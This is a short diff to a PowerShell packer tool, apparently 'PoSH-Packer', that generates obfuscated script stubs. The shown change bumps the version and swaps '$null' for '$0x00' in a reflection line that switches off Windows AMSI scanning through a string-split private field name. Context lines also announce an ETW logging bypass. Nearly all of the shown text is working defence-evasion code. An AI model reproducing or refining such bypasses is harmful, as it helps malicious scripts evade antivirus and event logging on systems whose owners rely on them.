@@ -20,7 +20,7 @@ Write-Output "
  | _ \___/ __| || |___| _ \___  __| |_____ _ _ 
  |  _/ _ \__ \ __ |___|  _/ _ |/ _| / / -_) '_|
  |_| \___/___/_||_|   |_| \__,|\__|_\_\___|_|  
-                                             v1.4
+                                             v1.5
 Usage: 
 > Invoke-PoSH-Packer -FileUrl https://URL/script.ps1 -OutFile C:\path\Packed-script.ps1
 > Invoke-PoSH-Packer -FilePath C:\path\script.ps1 -OutFile C:\path\Packed-script.ps1
@@ -149,7 +149,7 @@ function Invoke-PoSH-Packer {
         $stub_template += $code_fixed_order5 -join ''
         $code_fixed_order6 += '${23} = ${22}.GetField(("am"+${20}+"Init"+${24}),"NonPublic,Static")' + "`r`n"
         $stub_template += $code_fixed_order6 -join ''
-        $code_fixed_order7 += '${23}.SetValue($null,$true)' + "`r`n"
+        $code_fixed_order7 += '${23}.SetValue($0x00,$true)' + "`r`n"
         $stub_template += $code_fixed_order7 -join ''
         
         Write-Output "[*] Adding 'E'T'W' bypass" 
